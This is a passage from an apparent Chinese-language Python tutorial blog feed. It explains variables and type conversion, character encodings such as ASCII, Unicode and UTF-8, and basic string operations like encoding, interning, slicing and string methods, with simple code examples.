<p><strong>说明</strong>：比较运算符的优先级高于赋值运算符，所以<code>flag0 = 1 == 1</code>先做<code>1 == 1</code>产生布尔值<code>True</code>，再将这个值赋值给变量<code>flag0</code>。<code>print</code>函数可以输出多个值，多个值之间可以用<code>,</code>进行分隔，输出的内容之间默认以空格分开。</p>
</blockquote>
<h5 id="2-4、变量的使用"><a href="#2-4、变量的使用" class="headerlink" title="2.4、变量的使用"></a>2.4、变量的使用</h5><p>下面通过几个例子来说明变量的类型和变量使用。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">使用变量保存数据并进行加减乘除运算</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="number">321</span></span><br><span class="line">b = <span class="number">12</span></span><br><span class="line"><span class="built_in">print</span>(a + b)    <span class="comment"># 333</span></span><br><span class="line"><span class="built_in">print</span>(a - b)    <span class="comment"># 309</span></span><br><span class="line"><span class="built_in">print</span>(a * b)    <span class="comment"># 3852</span></span><br><span class="line"><span class="built_in">print</span>(a / b)    <span class="comment"># 26.75</span></span><br></pre></td></tr></table></figure>

<p>在Python中可以使用<code>type</code>函数对变量的类型进行检查。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">使用type()检查变量的类型</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">a = <span class="number">100</span></span><br><span class="line">b = <span class="number">12.345</span></span><br><span class="line">c = <span class="number">1</span> + <span class="number">5j</span></span><br><span class="line">d = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line">e = <span class="literal">True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(a))    <span class="comment"># &lt;class &#x27;int&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(b))    <span class="comment"># &lt;class &#x27;float&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(c))    <span class="comment"># &lt;class &#x27;complex&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(d))    <span class="comment"># &lt;class &#x27;str&#x27;&gt;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(e))    <span class="comment"># &lt;class &#x27;bool&#x27;&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以使用Python中内置的函数对变量类型进行转换。</p>
<ul>
<li><code>int()</code>：将一个数值或字符串转换成整数，可以指定进制。</li>
<li><code>float()</code>：将一个字符串转换成浮点数。</li>
<li><code>str()</code>：将指定的对象转换成字符串形式，可以指定编码。</li>
<li><code>chr()</code>：将整数转换成该编码对应的字符串（一个字符）。</li>
<li><code>ord()</code>：将字符串（一个字符）转换成对应的编码（整数）。</li>
</ul>
<h5 id="2-5、注释和行连接符"><a href="#2-5、注释和行连接符" class="headerlink" title="2.5、注释和行连接符"></a>2.5、注释和行连接符</h5><p>在python中，单行注释可用#表示，多行注释用’’’…’’’或”””…”””表示。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 单行注释</span></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">单引号多行注释</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">双引号多行注释</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>一行程序长度是没有限制的，但是为了可读性更强，通常将一行比较长的程序分为多行。这时，我们使用行连接符(\)来将多行连接起来</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">abc=<span class="string">&quot;qsabjd\</span></span><br><span class="line"><span class="string">dwewew\</span></span><br><span class="line"><span class="string">ewewew&quot;</span></span><br><span class="line"><span class="built_in">print</span>(abc) <span class="comment"># qsabjddwewewewewew</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python基础</tag>
      </tags>
  </entry>
  <entry>
    <title>数据结构——字符串</title>
    <url>/post/8f29adc8.html</url>
    <content><![CDATA[<hr>
<blockquote>
<p>本章概述：python基础——字符串的基本使用</p>
</blockquote>
<hr>
<span id="more"></span>



<h4 id="一、字符编码"><a href="#一、字符编码" class="headerlink" title="一、字符编码"></a>一、字符编码</h4><p>在将字符串使用之前，我们有必要先了解一下字符编码。字符串也是一种数据类型，但是，字符串比较特殊的是还有一个编码问题。</p>
<h5 id="1、ASCII编码"><a href="#1、ASCII编码" class="headerlink" title="1、ASCII编码"></a>1、ASCII编码</h5><p>因为计算机只能处理数字，如果要处理文本，就必须先把文本转换为数字才能处理。最早的计算机在设计时采用8个比特（bit）作为一个字节（byte），所以，一个字节能表示的最大的整数就是255（二进制11111111&#x3D;十进制255），如果要表示更大的整数，就必须用更多的字节。比如两个字节可以表示的最大整数是65535，4个字节可以表示的最大整数是4294967295。</p>
<p>由于计算机是美国人发明的，因此，最早只有127个字符被编码到计算机里，也就是大小写英文字母、数字和一些符号，这个编码表被称为<code>ASCII</code>编码，比如大写字母<code>A</code>的编码是<code>65</code>，小写字母<code>z</code>的编码是<code>122</code>，因此，<code>ASCII</code>编码为一个字节。</p>
<h5 id="2、GB2312及其他编码"><a href="#2、GB2312及其他编码" class="headerlink" title="2、GB2312及其他编码"></a>2、GB2312及其他编码</h5><p>前面说过了，<code>ASCII</code>编码为一个字节，但是要处理中文显然一个字节是不够的，至少需要两个字节，而且还不能和ASCII编码冲突，所以，中国制定了<code>GB2312</code>编码，用来把中文编进去。</p>
<p>你可以想得到的是，全世界有上百种语言，日本把日文编到<code>Shift_JIS</code>里，韩国把韩文编到<code>Euc-kr</code>里，各国有各国的标准，就会不可避免地出现冲突，结果就是，在多语言混合的文本中，显示出来会有乱码。</p>
<h5 id="3、Unicode字符"><a href="#3、Unicode字符" class="headerlink" title="3、Unicode字符"></a>3、Unicode字符</h5><p><code>Unicode</code>把所有语言都统一到一套编码里，这样就不会再有乱码问题了。</p>
<p><code>Unicode</code>标准也在不断发展，但最常用的是UCS-16编码，用两个字节表示一个字符（如果要用到非常偏僻的字符，就需要4个字节）。</p>
<p>ASCII编码和Unicode编码的区别：ASCII编码是1个字节，而Unicode编码通常是2个字节。</p>
<p>字母<code>A</code>用ASCII编码是十进制的<code>65</code>，二进制的<code>01000001</code>；</p>
<p>字符<code>0</code>用ASCII编码是十进制的<code>48</code>，二进制的<code>00110000</code>，注意字符<code>&#39;0&#39;</code>和整数<code>0</code>是不同的；</p>
<p>汉字<code>中</code>已经超出了ASCII编码的范围，用Unicode编码是十进制的<code>20013</code>，二进制的<code>01001110 00101101</code>。</p>
<p>把ASCII编码的<code>A</code>用Unicode编码，只需要在前面补0就可以，因此，<code>A</code>的Unicode编码是<code>00000000 01000001</code>。</p>
<h5 id="4、可变长编码——UTF-8"><a href="#4、可变长编码——UTF-8" class="headerlink" title="4、可变长编码——UTF-8"></a>4、可变长编码——UTF-8</h5><p>Unicode不会出现乱码问题，也能把全球的所有文字字符都表示进去，但是新的问题又出现了：如果统一成Unicode编码，乱码问题从此消失了。但是，如果你写的文本基本上全部是英文的话，用Unicode编码比ASCII编码需要多一倍的存储空间，在存储和传输上就十分不划算。</p>
<p>所以，本着节约的精神，又出现了把Unicode编码转化为“可变长编码”的<code>UTF-8</code>编码。UTF-8编码把一个Unicode字符根据不同的数字大小编码成1-6个字节，常用的英文字母被编码成1个字节，汉字通常是3个字节，只有很生僻的字符才会被编码成4-6个字节。如果你要传输的文本包含大量英文字符，用UTF-8编码就能节省空间。</p>
<table>
<thead>
<tr>
<th align="center">字符</th>
<th align="center">ASCII</th>
<th align="center">Unicode</th>
<th align="center">UTF-8</th>
</tr>
</thead>
<tbody><tr>
<td align="center">A</td>
<td align="center">01000001</td>
<td align="center">00000000 01000001</td>
<td align="center">01000001</td>
</tr>
<tr>
<td align="center">中</td>
<td align="center">无</td>
<td align="center">01001110 00101101</td>
<td align="center">11100100 10111000 10101101</td>
</tr>
</tbody></table>
<p>UTF-8编码有一个额外的好处，就是ASCII编码实际上可以被看成是UTF-8编码的一部分，所以，大量只支持ASCII编码的历史遗留软件可以在UTF-8编码下继续工作</p>
<h5 id="5、字符编码工作方式"><a href="#5、字符编码工作方式" class="headerlink" title="5、字符编码工作方式"></a>5、字符编码工作方式</h5><p>在计算机内存中，统一使用Unicode编码，当需要保存到硬盘或者需要传输的时候，就转换为UTF-8编码。用记事本编辑的时候，从文件读取的UTF-8字符被转换为Unicode字符到内存里，编辑完成后，保存的时候再把Unicode转换为UTF-8保存到文件。浏览网页的时候，服务器会把动态生成的Unicode内容转换为UTF-8再传输到浏览器。所以你看到很多网页的源码上会有类似<code>&lt;meta charset=&quot;UTF-8&quot; /&gt;</code>的信息，表示该网页正是用的UTF-8编码。</p>
<h4 id="二、python的字符串"><a href="#二、python的字符串" class="headerlink" title="二、python的字符串"></a>二、python的字符串</h4><h5 id="1、python字符串的编码方式"><a href="#1、python字符串的编码方式" class="headerlink" title="1、python字符串的编码方式"></a>1、python字符串的编码方式</h5><p>在python3中，字符串是以Unicode编码的，也就是说，Python的字符串支持多语言。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello, world!&#x27;</span></span><br><span class="line">s2 = <span class="string">&quot;你好，世界！&quot;</span></span><br><span class="line"><span class="built_in">print</span>(s1, s2)</span><br></pre></td></tr></table></figure>

<p>Python提供了<code>ord()</code>函数获取字符的Unicode值，<code>chr()</code>函数把Unicode值转换为对应的字符。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)</span><br><span class="line"><span class="number">65</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">ord</span>(<span class="string">&#x27;中&#x27;</span>)</span><br><span class="line"><span class="number">20013</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">66</span>)</span><br><span class="line"><span class="string">&#x27;B&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">25991</span>)</span><br><span class="line"><span class="string">&#x27;文&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">chr</span>(<span class="number">0x4e2d</span>)</span><br><span class="line"><span class="string">&#x27;中&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果知道字符的整数编码，还可以用十六进制这么写<code>str</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; &#x27;\u4e2d\u6587&#x27;</span><br><span class="line">&#x27;中文&#x27;</span><br></pre></td></tr></table></figure>

<h5 id="2、编码和解码"><a href="#2、编码和解码" class="headerlink" title="2、编码和解码"></a>2、编码和解码</h5><p>Python的字符串类型是<code>str</code>，在内存中以Unicode表示，一个字符对应若干个字节。如果要在网络上传输，或者保存到磁盘上，就需要把<code>str</code>变为以字节为单位的<code>bytes</code>。</p>
<p>纯英文的<code>str</code>可以用<code>ASCII</code>编码为<code>bytes</code>，内容是一样的，含有中文的<code>str</code>可以用<code>UTF-8</code>编码为<code>bytes</code>。含有中文的<code>str</code>无法用<code>ASCII</code>编码，因为中文编码的范围超过了<code>ASCII</code>编码的范围，Python会报错。Python对<code>bytes</code>类型的数据用带<code>b</code>前缀的单引号或双引号表示。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;ABC&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;ABC&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">UnicodeEncodeError: <span class="string">&#x27;ascii&#x27;</span> codec can<span class="string">&#x27;t encode characters in position 0-1: ordinal not in range(128)</span></span><br></pre></td></tr></table></figure>

<p>在<code>bytes</code>中，无法显示为ASCII字符的字节，用<code>\x##</code>显示。</p>
<p>反过来，如果我们从网络或磁盘上读取了字节流，那么读到的数据就是<code>bytes</code>。要把<code>bytes</code>变为<code>str</code>，就需要用<code>decode()</code>方法。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;ABC&#x27;</span>.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;ABC&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;\xe4\xb8\xad\xe6\x96\x87&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;中文&#x27;</span></span><br></pre></td></tr></table></figure>

<p>如果<code>bytes</code>中只有一小部分无效的字节，可以传入<code>errors=&#39;ignore&#39;</code>忽略错误的字节</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">b&#x27;\xe4\xb8\xad\xff&#x27;</span>.decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"><span class="string">&#x27;中&#x27;</span></span><br></pre></td></tr></table></figure>

<h5 id="3、字符串驻留机制"><a href="#3、字符串驻留机制" class="headerlink" title="3、字符串驻留机制"></a>3、字符串驻留机制</h5><p>字符串驻留：仅保存一份相同且不可变字符串的方法，不同的值被存放在字符串驻留池中。</p>
<p>Python 支持字符串驻留机制，对于符合标识符规则的字符串（仅包含下划线（_）、字母和数字）会启用字符串驻留机制。也就是说，当定义多个相同的符合上述所说的规则的字符串时，在内存中仅保留一份，然后将变量映射到相同的内存中去。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;abc123&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b=<span class="string">&#x27;abc123&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(a)</span><br><span class="line"><span class="number">3134634372784</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(b)</span><br><span class="line"><span class="number">3134634372784</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>c=<span class="string">&#x27;a!&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>d=<span class="string">&#x27;a!&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(c)</span><br><span class="line"><span class="number">3134634353072</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(d)</span><br><span class="line"><span class="number">3134629631472</span></span><br></pre></td></tr></table></figure>

<p>上面的例子可以发现，a和b指向同一个内存地址，c和d则不是。因为ab负责字符串驻留机制的规则，cd不符合驻留机制。</p>
<h4 id="三、字符串基本使用"><a href="#三、字符串基本使用" class="headerlink" title="三、字符串基本使用"></a>三、字符串基本使用</h4><h5 id="1、转义字符和原始字符"><a href="#1、转义字符和原始字符" class="headerlink" title="1、转义字符和原始字符"></a>1、转义字符和原始字符</h5><p>可以在字符串中使用<code>\</code>（反斜杠）来表示转义，也就是说<code>\</code>后面的字符不再是它原来的意义，例如：<code>\n</code>不是代表反斜杠和字符<code>n</code>，而是表示换行；<code>\t</code>也不是代表反斜杠和字符<code>t</code>，而是表示制表符。所以如果字符串本身又包含了<code>&#39;</code>、<code>&quot;</code>、<code>\</code>这些特殊的字符，必须要通过<code>\</code>进行转义处理</p>
<p>Python中的字符串可以<code>r</code>或<code>R</code>开头，这种字符串被称为原始字符串，意思是字符串中的每个字符都是它本来的含义，没有所谓的转义字符。例如，在字符串<code>&#39;hello\n&#39;</code>中，<code>\n</code>表示换行；而在<code>r&#39;hello\n&#39;</code>中，<code>\n</code>不再表示换行，就是反斜杠和字符<code>n</code>。所以当需要转义时则使用反斜杠，不需要时以r开头即可。</p>
<h5 id="2、字符串运算"><a href="#2、字符串运算" class="headerlink" title="2、字符串运算"></a>2、字符串运算</h5><p>Python为字符串类型提供了非常丰富的运算符，我们可以使用<code>+</code>运算符来实现字符串的拼接，可以使用<code>*</code>运算符来重复一个字符串的内容，可以使用<code>in</code>和<code>not in</code>来判断一个字符串是否包含另外一个字符串，我们也可以用<code>[]</code>和<code>[:]</code>运算符从字符串取出某个字符或某些字符。</p>
<h6 id="2-1、拼接和重复"><a href="#2-1、拼接和重复" class="headerlink" title="2.1、拼接和重复"></a>2.1、拼接和重复</h6><p>下面的例子演示了使用<code>+</code>和<code>*</code>运算符来实现字符串的拼接和重复操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello&#x27;</span> + <span class="string">&#x27; &#x27;</span> + <span class="string">&#x27;world&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s1)    <span class="comment"># hello world</span></span><br><span class="line">s2 = <span class="string">&#x27;!&#x27;</span> * <span class="number">3</span></span><br><span class="line"><span class="built_in">print</span>(s2)    <span class="comment"># !!!</span></span><br><span class="line">s1 += s2     <span class="comment"># s1 = s1 + s2</span></span><br><span class="line"><span class="built_in">print</span>(s1)    <span class="comment"># hello world!!!</span></span><br><span class="line">s1 *= <span class="number">2</span>      <span class="comment"># s1 = s1 * 2</span></span><br><span class="line"><span class="built_in">print</span>(s1)    <span class="comment"># hello world!!!hello world!!!</span></span><br></pre></td></tr></table></figure>

<h6 id="2-2、比较运算"><a href="#2-2、比较运算" class="headerlink" title="2.2、比较运算"></a>2.2、比较运算</h6><p>对于两个字符串类型的变量，可以直接使用比较运算符比较两个字符串的相等性或大小。前面讲编码的时候也有讲到，字符串在内存中是以Unicode表示的，所以字符串的大小比较比的是每个字符对应的编码的大小。例如<code>A</code>的编码是<code>65</code>， 而<code>a</code>的编码是<code>97</code>，所以<code>&#39;A&#39; &lt; &#39;a&#39;</code>的结果相当于就是<code>65 &lt; 97</code>的结果，很显然是<code>True</code>；而<code>&#39;boy&#39; &lt; &#39;bad&#39;</code>，因为第一个字符都是<code>&#39;b&#39;</code>比不出大小，所以实际比较的是第二个字符的大小，显然<code>&#39;o&#39; &lt; &#39;a&#39;</code>的结果是<code>False</code>，所以<code>&#39;boy&#39; &lt; &#39;bad&#39;</code>的结果也是<code>False</code>。至于字符的编码是多少，前面也有说过，可以用ord函数获得。下面的代码为大家展示了字符串的比较运算。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;a whole new world&#x27;</span></span><br><span class="line">s2 = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s1 == s2, s1 &lt; s2)      <span class="comment"># False True</span></span><br><span class="line"><span class="built_in">print</span>(s2 == <span class="string">&#x27;hello world&#x27;</span>)    <span class="comment"># True</span></span><br><span class="line"><span class="built_in">print</span>(s2 == <span class="string">&#x27;Hello world&#x27;</span>)    <span class="comment"># False</span></span><br><span class="line"><span class="built_in">print</span>(s2 != <span class="string">&#x27;Hello world&#x27;</span>)    <span class="comment"># True</span></span><br><span class="line">s3 = <span class="string">&#x27;百度&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(<span class="string">&#x27;百&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;度&#x27;</span>))    <span class="comment">#30334 24230</span></span><br><span class="line">s4 = <span class="string">&#x27;王大锤&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">ord</span>(<span class="string">&#x27;王&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;大&#x27;</span>), <span class="built_in">ord</span>(<span class="string">&#x27;锤&#x27;</span>))    <span class="comment"># 29579 22823 38180</span></span><br><span class="line"><span class="built_in">print</span>(s3 &gt; s4, s3 &lt;= s4)      <span class="comment"># True False</span></span><br></pre></td></tr></table></figure>

<p>Python中还有一个<code>is</code>运算符（身份运算符），如果用<code>is</code>来比较两个字符串，它比较的是两个变量对应的字符串对象的内存地址，简单的说就是两个变量是否对应内存中的同一个字符串。另外还可以通过id函数来查看变量在内存中的位置。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">s2 = <span class="string">&#x27;hello world&#x27;</span></span><br><span class="line">s3 = s2</span><br><span class="line"><span class="comment"># 比较字符串的内容</span></span><br><span class="line"><span class="built_in">print</span>(s1 == s2, s2 == s3)    <span class="comment"># True True</span></span><br><span class="line"><span class="comment"># 比较字符串的内存地址</span></span><br><span class="line"><span class="built_in">print</span>(s1 <span class="keyword">is</span> s2, s2 <span class="keyword">is</span> s3)    <span class="comment"># False True</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">id</span>(s1),<span class="built_in">id</span>(s2),<span class="built_in">id</span>(s3))   <span class="comment">#1800411810608 1800411810800 1800411810800</span></span><br></pre></td></tr></table></figure>



<h6 id="2-3、成员运算"><a href="#2-3、成员运算" class="headerlink" title="2.3、成员运算"></a>2.3、成员运算</h6><p>Python中可以用<code>in</code>和<code>not in</code>判断一个字符串中是否存在另外一个字符或字符串，<code>in</code>和<code>not in</code>运算通常称为成员运算，会产生布尔值<code>True</code>或<code>False</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;wo&#x27;</span> <span class="keyword">in</span> s1)    <span class="comment"># True</span></span><br><span class="line">s2 = <span class="string">&#x27;goodbye&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(s2 <span class="keyword">in</span> s1)      <span class="comment"># False</span></span><br></pre></td></tr></table></figure>



<h6 id="2-4、获取字符串长度"><a href="#2-4、获取字符串长度" class="headerlink" title="2.4、获取字符串长度"></a>2.4、获取字符串长度</h6><p>函数<code>len</code>可以获取字符串长度</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;hello, world&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(s))                   <span class="comment"># 12</span></span><br></pre></td></tr></table></figure>

<p>如果想获取字节数，则需要把字符串编码成bytes。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">len</span>(<span class="string">&#x27;中文&#x27;</span>.encode(<span class="string">&#x27;utf-8&#x27;</span>))   <span class="comment">#6</span></span><br></pre></td></tr></table></figure>



<h6 id="2-5、索引和切片"><a href="#2-5、索引和切片" class="headerlink" title="2.5、索引和切片"></a>2.5、索引和切片</h6><p>我们可以从字符串中取出某个字符，称为索引计算，索引从0开始，0代表字符串中的第一个字符，因此长度为n的字符串，索引范围为0到n-1，最后一个字符的索引也可以表示为-1，所以索引范围也可以是-1到-n。注意，因为<strong>字符串是不可变类型</strong>，所以<strong>不能通过索引运算修改字符串中的字符</strong>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;blog.z7sz.top&quot;</span></span><br><span class="line">length=<span class="built_in">len</span>(name)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取第一个字符</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>],name[-length])   <span class="comment">#b  b</span></span><br><span class="line"><span class="comment"># 获取最后一个字符</span></span><br><span class="line"><span class="built_in">print</span>(name[-<span class="number">1</span>],name[length-<span class="number">1</span>])  <span class="comment">#p</span></span><br></pre></td></tr></table></figure>

<p>在进行索引操作时，如果索引越界（不在索引范围内）时，会引发<code>IndexError</code>异常。</p>
<p>如果要从字符串中取出多个字符，我们可以对字符串进行切片，运算符是<code>[i:j:k]</code>，其中<code>i</code>是开始索引，索引对应的字符可以取到；<code>j</code>是结束索引，索引对应的字符不能取到；<code>k</code>是步长，默认值为<code>1</code>。假设字符串的长度为<code>N</code>，当<code>k &gt; 0</code>时表示正向切片（从前向后获取字符），如果没有给出<code>i</code>和<code>j</code>的值，则<code>i</code>的默认值是<code>0</code>，<code>j</code>的默认值是<code>N</code>；当<code>k &lt; 0</code>时表示负向切片（从后向前获取字符），如果没有给出<code>i</code>和<code>j</code>的值，则<code>i</code>的默认值是<code>-1</code>，j的默认值是<code>-N - 1</code>。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;blog.z7sz.top&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># k=1的正向切片操作</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>:<span class="number">3</span>])  <span class="comment">#blo</span></span><br><span class="line"><span class="built_in">print</span>(name[-<span class="number">7</span>:-<span class="number">4</span>])   <span class="comment">#7sz</span></span><br><span class="line"><span class="comment"># k=2的正向切片操作</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">0</span>:<span class="number">3</span>:<span class="number">2</span>])   <span class="comment">#bo</span></span><br><span class="line"><span class="comment"># k=-1的负向切片操作</span></span><br><span class="line"><span class="built_in">print</span>(name[<span class="number">7</span>:<span class="number">1</span>:-<span class="number">1</span>])   <span class="comment">#s7z.go</span></span><br><span class="line"><span class="built_in">print</span>(name[::-<span class="number">1</span>])   <span class="comment">#pot.zs7z.golb  字符串倒序的一种方法</span></span><br></pre></td></tr></table></figure>



<h6 id="2-6、循环遍历每个字符"><a href="#2-6、循环遍历每个字符" class="headerlink" title="2.6、循环遍历每个字符"></a>2.6、循环遍历每个字符</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s1 = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> s1:</span><br><span class="line">    <span class="built_in">print</span>(ch)</span><br></pre></td></tr></table></figure>



<h4 id="3、字符串的方法"><a href="#3、字符串的方法" class="headerlink" title="3、字符串的方法"></a>3、字符串的方法</h4><p>在Python中，我们可以通过字符串类型自带的方法对字符串进行操作和处理。</p>
<h6 id="3-1、大小写相关操作"><a href="#3-1、大小写相关操作" class="headerlink" title="3.1、大小写相关操作"></a>3.1、大小写相关操作</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">name = <span class="string">&quot;blog.z7sz.top&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 把字符串中的第一个字符首字母大写</span></span><br><span class="line"><span class="built_in">print</span>(name.capitalize())  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 把字符串中每一个单词的首字母大写</span></span><br><span class="line"><span class="built_in">print</span>(name.title())  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换字符串中所有大写字符为小写</span></span><br><span class="line"><span class="built_in">print</span>(name.lower())  </span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换字符串所有小写字符为大写</span></span><br><span class="line"><span class="built_in">print</span>(name.upper())  </span><br></pre></td></tr></table></figure>

<h6 id="3-2、查找操作"><a href="#3-2、查找操作" class="headerlink" title="3.2、查找操作"></a>3.2、查找操作</h6><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 寻找字符（find，rfind，index，rindex）</span></span><br><span class="line"><span class="built_in">print</span>(name.find(<span class="string">&quot;a&quot;</span>))  <span class="comment"># 从左到右找，直至找到想要寻找的字符串的位置位置，找不到则返回-1</span></span><br><span class="line"><span class="built_in">print</span>(name.rfind(<span class="string">&quot;z&quot;</span>))  <span class="comment"># 从右往左找，直至找到想要寻找的字符串的位置位置，找不到则返回-1</span></span><br><span class="line"><span class="built_in">print</span>(name.index(<span class="string">&quot;a&quot;</span>))  <span class="comment"># 用法跟find一样，找不到报错</span></span><br><span class="line"><span class="built_in">print</span>(name.rindex(<span class="string">&quot;z&quot;</span>))  <span class="comment"># 用法跟rfind一样，找不到报错</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(name.find(<span class="string">&#x27;o&#x27;</span>, <span class="number">5</span>))   <span class="comment"># 从索引为5的位置开始查找字符o出现的位置</span></span><br><span class="line"><span class="built_in">print</span>(name.index(<span class="string">&#x27;o&#x27;</span>, <span class="number">5</span>))   <span class="comment"># 从索引为5的位置开始查找字符o出现的位置</span></span><br></pre></td></tr></table></figure>

<h6 id="3-3、性质判断"><a href="#3-3、性质判断" class="headerlink" title="3.3、性质判断"></a>3.3、性质判断</h6><p>可以通过字符串的<code>startswith</code>、<code>endswith</code>来判断字符串是否以某个字符串开头和结尾；还可以用<code>is</code>开头的方法判断字符串的特征，这些方法都返回布尔值。</p>
